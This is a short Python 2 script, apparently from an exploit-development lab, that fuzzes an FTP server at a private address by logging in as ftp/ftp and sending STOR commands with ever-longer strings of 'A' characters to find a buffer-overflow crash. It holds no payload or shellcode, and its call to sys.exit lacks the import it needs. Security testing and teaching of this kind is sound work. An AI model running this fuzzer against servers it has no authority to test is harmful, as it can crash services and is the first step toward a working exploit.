#!/usr/bin/python
 
import socket

host= "172.16.162.136"
port = 21

# Define the FTP commands to be fuzzed
commands=["STOR"]
 
# Run the fuzzing loop

for command in commands:
    size=0
    while True:
        string = "A" * size
        print "Fuzzing " + command + " with length:" +str(len(string))
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((host, port))
        except:
            print ("[-] Connection error!")
            sys.exit(1)

        s.recv(1024)
        s.send('USER ftp\r\n')
        s.recv(1024)
        s.send('PASS ftp\r\n')
        s.recv(1024)
        s.send(command + ' ' + string + '\r\n')
        s.recv(1024)
        s.send('QUIT\r\n')
        s.close()
        
        size += 100
